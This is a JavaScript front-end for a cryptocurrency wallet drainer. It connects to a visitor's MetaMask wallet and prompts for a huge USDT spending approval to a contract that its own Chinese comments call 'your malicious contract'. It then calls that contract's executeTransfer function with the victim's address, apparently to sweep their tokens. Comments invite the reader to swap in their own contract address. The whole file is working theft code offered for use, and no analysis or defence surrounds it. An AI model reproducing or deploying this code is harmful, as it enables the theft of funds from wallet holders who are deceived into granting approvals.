const contractAddress = '0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b'; // 改为你的合约地址
const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT合约地址

const maliciousABI = [
    // 你的恶意合约ABI
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "user",
                "type": "address"
            }
        ],
        "name": "executeTransfer",
        "outputs": [],
        "stateMutability": "nonpayable",
        "type": "function"
    }
];

const usdtABI = [
    // USDT合约ABI
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "spender",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "approve",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "sender",
                "type": "address"
            },
            {
                "internalType": "address",
                "name": "recipient",
                "type": "address"
            },
            {
                "internalType": "uint256",
                "name": "amount",
                "type": "uint256"
            }
        ],
        "name": "transferFrom",
        "outputs": [
            {
                "internalType": "bool",
                "name": "",
                "type": "bool"
            }
        ],
        "stateMutability": "nonpayable",
        "type": "function"
    },
    {
        "inputs": [
            {
                "internalType": "address",
                "name": "account",
                "type": "address"
            }
        ],
        "name": "balanceOf",
        "outputs": [
            {
                "internalType": "uint256",
                "name": "",
                "type": "uint256"
            }
        ],
        "stateMutability": "view",
        "type": "function"
    }
];

let web3;
let maliciousContract;
let userAccount;

document.getElementById('connectButton').onclick = async () => {
    if (window.ethereum) {
        web3 = new Web3(window.ethereum);
        try {
            await window.ethereum.request({ method: 'eth_requestAccounts' });
            userAccount = await web3.eth.getAccounts().then(accounts => accounts[0]);
            alert('Wallet connected: ' + userAccount);
            document.getElementById('approveButton').disabled = false; // 启用授权按钮
        } catch (error) {
            alert('Failed to connect wallet: ' + error.message);
        }
    } else {
        alert('Please install MetaMask!');
    }
};

document.getElementById('approveButton').onclick = async () => {
    const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
    const amountToApprove = web3.utils.toWei('1000000', 'ether'); // 1000000 USDT

    try {
        await usdtContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
        alert('Approval successful');
        document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
    } catch (error) {
        alert('Approval failed: ' + error.message);
    }
};

document.getElementById('executeTransferButton').onclick = async () => {
    maliciousContract = new web3.eth.Contract(maliciousABI, contractAddress);

    try {
        await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
        alert('Transfer executed successfully');
    } catch (error) {
        alert('Transfer failed: ' + error.message);
    }
};
